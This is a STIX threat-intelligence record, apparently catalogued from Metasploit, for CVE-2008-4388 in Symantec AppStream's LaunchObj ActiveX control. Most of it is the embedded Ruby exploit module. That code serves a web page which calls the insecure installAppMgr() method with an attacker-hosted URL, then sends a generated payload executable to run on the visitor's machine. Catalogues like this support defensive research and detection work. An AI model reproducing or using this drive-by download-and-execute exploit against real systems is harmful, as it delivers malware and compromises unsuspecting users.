{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f497939a-d1c6-4aa5-aa83-48f9f6732b63",
    "created": "2024-08-14T16:41:33.04431Z",
    "modified": "2024-08-14T16:41:33.044315Z",
    "name": "Symantec AppStream LaunchObj ActiveX Control Arbitrary File Download and Execute",
    "description": " This module exploits a vulnerability in Symantec AppStream Client 5.x. The vulnerability is in the LaunchObj ActiveX control (launcher.dll 5.1.0.82) containing the \"installAppMgr()\" method. The insecure method can be exploited to download and execute arbitrary files in the context of the currently logged-on user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/symantec_appstream_unsafe.rb",
            "external_id": "symantec_appstream_unsafe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4388"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec AppStream LaunchObj ActiveX Control Arbitrary File Download and Execute',\n      'Description'    => %q{\n          This module exploits a vulnerability in Symantec AppStream Client 5.x. The vulnerability\n        is in the LaunchObj ActiveX control (launcher.dll 5.1.0.82) containing the \"installAppMgr()\"\n        method. The insecure method can be exploited to download and execute arbitrary files in the\n        context of the currently logged-on user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-4388' ],\n          [ 'OSVDB', '51410' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2009-01-15',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/payload\"\n\n    if (request.uri.match(/payload/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending payload EXE\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    vname  = rand_text_alpha(rand(100) + 1)\n    exe    = rand_text_alpha(rand(5) + 1 )\n\n    content = %Q|\n    <html>\n      <object id='#{vname}' classid='clsid:3356DB7C-58A7-11D4-AA5C-006097314BF8'></object>\n      <script language=\"javascript\">\n        #{vname}.installAppMgr(\"#{payload_url}/#{exe}.exe\");\n      </script>\n    </html>\n        |\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-01-15",
    "x_mitre_platforms": [
        "win'"
    ]
}